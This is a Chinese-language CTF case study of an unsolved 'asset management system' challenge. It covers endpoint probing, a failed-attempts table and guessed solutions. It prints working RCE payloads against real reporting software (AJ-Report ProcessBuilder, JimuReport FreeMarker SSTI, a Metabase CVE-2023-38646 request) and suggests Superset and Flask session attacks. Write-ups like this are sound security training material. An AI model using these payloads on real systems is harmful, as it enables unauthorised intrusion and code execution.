# Case Study: a-03 资产管理系统 (未通,调研记录)

**状态**: ❌ 未通 (本地 + 别人 session 都没拿到 flag)
**分数**: 0/300
**来源**: a-03.zip (用户提供的别人跑 a-03 的 5 个 sessions,共 403 steps)

---

## 题目

- **目标**: 资产管理系统
- **描述**:
  > "公司内部部署了一套资产管理系统,员工可以查看公司资产、提交报销申请和**生成报表**。最近 IT 部门收到报告称系统响应异常,怀疑存在安全漏洞。"
- **关键关键词**: **资产** + **报销** + **报表** = 报表平台思路
- **容器**: Flask Python (server: envoy, 实际是 envoy + Flask)
- **HTTP 行为**:
  - `/` → 302 → `/login`
  - `/assets` → 302 → `/login`
  - `/reimbursement` → 302 → `/login`
  - **`/login` → 500 Internal Server Error** (一致共识,blocket)
  - `/console`, `/__debugger__` → 404
- **flag 路径**: `/challenge/flag.txt` (推断,平台惯例)

## 关键调研发现(从 session 38530)

别人找到了**4 个相关的 CVE 模板**(虽然 a-03 实际是 Flask,这些是 Java 模板,但题目描述里"生成报表"指向这些):

### 1. AJ-Report CNVD-2024-15077 / CVE-2024-7314 (积木报表)
- **端点**: `POST /dataSetParam/verification;swagger-ui/`
- **漏洞**: 认证绕过 + Java ProcessBuilder RCE
- **端口**: 9095 (默认)
- **payload**:
  ```json
  {
    "ParamName":"","paramDesc":"","paramType":"","sampleItem":"1",
    "mandatory":true,"requiredFlag":1,
    "validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"
  }
  ```
- **认证绕过**: 路径加 `;swagger-ui/` 绕过 auth
- **PoC 位置**: `/home/kali/pocs/vulhub/aj-report/CNVD-2024-15077/`

### 2. JimuReport CVE-2023-4450 (JeecgBoot 积木报表)
- **端点**: `POST /jeecg-boot/jmreport/queryFieldBySql`
- **漏洞**: FreeMarker SSTI RCE
- **端口**: 8085 (默认)
- **payload**:
  ```json
  {
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")} ",
    "type": "0"
  }
  ```
- **PoC 位置**: `/home/kali/pocs/vulhub/jimureport/CVE-2023-4450/`

### 3. CVE-2020-4463 IBM Maximo Asset Management
- **类型**: SQL injection
- **匹配原因**: "Asset Management" 关键词
- **可能**: 如果是 IBM 资产管理系统

### 4. JeecgBoot 其他相关
- `jeecg-boot-detect.yaml` (指纹)
- `jeecg-boot-swagger.yaml` (暴露)
- `jeeplus-cms-resetpassword-sqli.yaml` (SQLi)

## /login 500 blocker 分析

session 38528 step 42 试了 SSTI 触发:
```
500 login?__class__=1
500 login?debug=1
500 login?next=/assets
500 login?x=1
```

**所有参数都 500**, 说明 /login 本身代码就 500,不是参数触发。

可能原因:
1. **设计 bug** — login 模板引用了不存在的资源
2. **SSTI 触发崩溃** — Jinja2 `__class__` 触发异常
3. **DB 连接失败** — login 时 query user table 失败
4. **envoy 配置问题** — 真实 Flask 在 envoy 后面,但 envoy 转发异常

**最可能: 模板缺失** (Flask TemplateNotFound),真实业务接口在 /assets /reimbursement 等(被 302 挡了)。

## 失败路径(避坑)

| 尝试 | 结果 |
|---|---|
| 50+ 端点枚举 (/, /assets, /api/v1/*, /health, /status 等) | 全部 302→/login 或 404 |
| `dirsearch` Flask 路由字典 | 只 /login 500,其他 404 |
| `werkzeug debug console` | 404 |
| SSTI in /login 参数 | 全部 500,无法区分 |
| `__debugger__=yes` 触发 traceback | 404 |
| nuclei 跑 AJ-Report/JimuReport CVE 模板 | **没真打** — 因为容器是 Flask 不是 Java |

## 真解法推测(下次跑参考)

题目 a-03 description 关键:**"生成报表"** → 真解大概率是**Python 报表系统**(不是 Java AJ-Report)

**可能 Python 报表系统**:
1. **Apache Superset** (CVE-2023-27524 等) - 5000 端口
2. **Metabase** (CVE-2023-38646 等) - 3000 端口
3. **DataEase** (开源 BI, Java) - 8080/8100 端口
4. **JimuReport 也有 Python 类似品**

**推荐攻击路径**:
1. 先 nmap 端口 5000/3000/8080/8100/9095/8085 (不是只看 80)
2. 看 envoy 后端真实端口(可能有多个)
3. 试 **Metabase CVE-2023-38646** (RCE): 
   ```
   POST /api/setup/validate
   {"token":"...","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":7,"refingerprint":false,"auto_run_queries":true,"schedules":{"metabase_default":{"schedule_minute":"0","schedule_day":null,"schedule_hour":null,"schedule_type":"daily"}},"databases":[{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"refingerprint":false,"cache_ttl":7,"details":{"db":"...","advanced-options":false,"ssl":false},"name":"x","engine":"postgres"}]}}
   ```
4. 试 **Superset CVE-2023-27524** (默认 admin/admin)
5. 试 **flask session 伪造** — 如果发现 SECRET_KEY 弱,伪造 admin session
6. 试 **Flask debug PIN** — 如果是 dev 模式,算 PIN 进 /console

## 关键洞察

1. **题目描述 "生成报表" 是关键引导** — 但容器是 Flask 不直接对应 Java CVE
2. **/login 500 是设计行为** — 真实业务可能在 /assets /reimbursement 等被 302 挡的端点
3. **envoy 前面挡** — 真实 Flask 端口可能不在 80,需要 nmap 内部端口
4. **nuclei 模板库齐但未充分利用** — 别人调研到了 AJ-Report/JimuReport/Metabase 等,但没真打 PoC
5. **题目可能基于 Metabase / Superset** — 概率最高,Python + BI + 报表

## 关键词

`#flask` `#envoy` `#ssti` `#login-500` `#metabase` `#superset` `#dataease` `#aj-report` `#jimureport` `#bi-platform` `#asset-management`
